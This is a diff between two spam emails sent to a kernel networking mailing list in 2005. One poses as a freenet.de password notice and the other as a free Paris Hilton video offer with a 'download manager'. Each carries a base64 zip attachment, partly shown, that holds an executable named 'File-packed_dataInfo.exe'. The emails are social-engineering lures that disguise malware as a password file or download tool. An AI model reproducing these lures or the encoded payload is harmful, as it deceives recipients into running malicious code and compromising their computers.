@@ -1,29 +1,30 @@
-From: info@freenet.de
-Subject: Your Password
-Date: Thu, 15 Dec 2005 06:15:22 GMT
-Message-ID: <61b3.eb9329feec2e@freenet.de>
+From: hostmaster@detron.se.sgi.com
+Subject: Paris Hilton & Nicole Richie
+Date: Thu, 15 Dec 2005 06:33:27 GMT
+Message-ID: <c4d5b98caa871b195e9@detron.se>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==9615dc.1367ff2d15262"
+Content-Type: multipart/mixed; boundary="====ec1b7e4dc669ba83.77cf9"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: emailserv@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==9615dc.1367ff2d15262
+--====ec1b7e4dc669ba83.77cf9
 
-Protected message is attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.freenet.de
-***** Email: postman@freenet.de
---==9615dc.1367ff2d15262
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--====ec1b7e4dc669ba83.77cf9
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==9615dc.1367ff2d15262--
+--====ec1b7e4dc669ba83.77cf9--
